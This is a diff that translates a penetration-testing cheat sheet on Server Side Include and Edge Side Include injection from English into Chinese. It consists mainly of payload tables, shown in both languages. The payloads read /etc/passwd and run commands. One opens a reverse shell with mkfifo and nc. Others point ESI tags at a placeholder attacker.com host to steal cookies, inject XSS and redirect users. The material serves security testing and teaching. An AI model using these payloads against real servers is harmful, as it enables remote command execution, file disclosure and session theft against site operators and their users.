@@ -1,60 +1,62 @@
-# Server Side Include Injection
+[原文文档](README.en.md)
 
-> Server Side Includes (SSI) are directives that are placed in HTML pages and evaluated on the server while the pages are being served. They let you add dynamically generated content to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.
+# 服务器端包含注入
 
-## Summary
+> 服务器端包含（SSI）是放置在 HTML 页面中的指令，在页面提供服务时在服务器上进行评估。它们让您可以将动态生成的内容添加到现有的 HTML 页面，而不必通过 CGI 程序或其他动态技术来提供整个页面。
 
-* [Methodology](#methodology)
-* [Edge Side Inclusion](#edge-side-inclusion)
-* [References](#references)
+## 摘要
 
-## Methodology
+* [方法论](#方法论)
+* [边缘侧包含](#边缘侧包含)
+* [参考资料](#参考资料)
 
-SSI Injection occurs when an attacker can input Server Side Include directives into a web application. SSIs are directives that can include files, execute commands, or print environment variables/attributes. If user input is not properly sanitized within an SSI context, this input can be used to manipulate server-side behavior and access sensitive information or execute commands.
+## 方法论
 
-SSI format: `<!--#directive param="value" -->`
+当攻击者能够向 Web 应用程序输入服务器端包含指令时，就会发生 SSI 注入。SSI 是可以包含文件、执行命令或打印环境变量/属性的指令。如果在 SSI 上下文中用户输入没有得到适当的清理，此输入可用于操纵服务器端行为并访问敏感信息或执行命令。
 
-| Description             | Payload                                  |
-| ----------------------- | ---------------------------------------- |
-| Print the date          | `<!--#echo var="DATE_LOCAL" -->`         |
-| Print the document name | `<!--#echo var="DOCUMENT_NAME" -->`      |
-| Print all the variables | `<!--#printenv -->`                      |
-| Setting variables       | `<!--#set var="name" value="Rich" -->`   |
-| Include a file          | `<!--#include file="/etc/passwd" -->`    |
-| Include a file          | `<!--#include virtual="/index.html" -->` |
-| Execute commands        | `<!--#exec cmd="ls" -->`                 |
-| Reverse shell           | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |
+SSI 格式：`<!--#directive param="value" -->`
 
-## Edge Side Inclusion
+| 描述             | 负载                               |
+| ---------------- | ---------------------------------- |
+| 打印日期          | `<!--#echo var="DATE_LOCAL" -->`         |
+| 打印文档名称 | `<!--#echo var="DOCUMENT_NAME" -->`      |
+| 打印所有变量 | `<!--#printenv -->`                      |
+| 设置变量       | `<!--#set var="name" value="Rich" -->`   |
+| 包含文件          | `<!--#include file="/etc/passwd" -->`    |
+| 包含文件          | `<!--#include virtual="/index.html" -->` |
+| 执行命令        | `<!--#exec cmd="ls" -->`                 |
+| 反向 shell           | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |
 
-HTTP surrogates cannot differentiate between genuine ESI tags from the upstream server and malicious ones embedded in the HTTP response. This means that if an attacker manages to inject ESI tags into the HTTP response, the surrogate will process and evaluate them without question, assuming they are legitimate tags originating from the upstream server.
+## 边缘侧包含
 
-Some surrogates will require ESI handling to be signaled in the Surrogate-Control HTTP header.
+HTTP 代理无法区分来自上游服务器的真实 ESI 标签和嵌入在 HTTP 响应中的恶意标签。这意味着，如果攻击者成功将 ESI 标签注入 HTTP 响应，代理将不加区别地处理和评估它们，假设它们是来自上游服务器的真实标签。
+
+一些代理需要通过 Surrogate-Control HTTP 头部发出信号来处理 ESI。
 
 ```ps1
 Surrogate-Control: content="ESI/1.0"
 ```
 
-| Description             | Payload                                  |
-| ----------------------- | ---------------------------------------- |
-| Blind detection         | `<esi:include src=http://attacker.com>`  |
+| 描述             | 负载                               |
+| ---------------- | ---------------------------------- |
+| 盲检测         | `<esi:include src=http://attacker.com>`  |
 | XSS                     | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |
-| Cookie stealer          | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
-| Include a file          | `<esi:include src="supersecret.txt">` |
-| Display debug info      | `<esi:debug/>` |
-| Add header              | `<!--esi $add_header('Location','http://attacker.com') -->` |
-| Inline fragment         | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |
+| Cookie 窃取器          | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
+| 包含文件          | `<esi:include src="supersecret.txt">` |
+| 显示调试信息      | `<esi:debug/>` |
+| 添加头部              | `<!--esi $add_header('Location','http://attacker.com') -->` |
+| 内联片段         | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |
 
-| Software | Includes | Vars | Cookies | Upstream Headers Required | Host Whitelist |
+| 软件 | 包含 | 变量 |  Cookie | 需要上游头部 | 主机白名单 |
 | -------- | -------- | ---- | ------- | ------------------------- | -------------- |
-| Squid3   | Yes      | Yes  | Yes     | Yes                       | No             |
-| Varnish Cache | Yes | No   | No      | Yes                       | Yes            |
-| Fastly   | Yes      | No   | No      | No                        | Yes            |
-| Akamai ESI Test Server (ETS) | Yes | Yes | Yes | No              | No             |
-| NodeJS' esi | Yes   | Yes  | Yes     | No                        | No             |
-| NodeJS' nodesi | Yes | No  | No      | No                        | Optional       |
+| Squid3   | 是      | 是  | 是     | 是                       | 否             |
+| Varnish Cache | 是 | 否   | 否      | 是                       | 是            |
+| Fastly   | 是      | 否   | 否      | 否                        | 是            |
+| Akamai ESI Test Server (ETS) | 是 | 是 | 是 | 否              | 否             |
+| NodeJS' esi | 是   | 是  | 是     | 否                        | 否             |
+| NodeJS' nodesi | 是 | 否  | 否      | 否                        | 可选       |
 
-## References
+## 参考资料
 
 * [Beyond XSS: Edge Side Include Injection - Louis Dion-Marcil - April 3, 2018](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
 * [DEF CON 26 - Edge Side Include Injection Abusing Caching Servers into SSRF - ldionmarcil - October 23, 2018](https://www.youtube.com/watch?v=VUZGZnpSg8I)
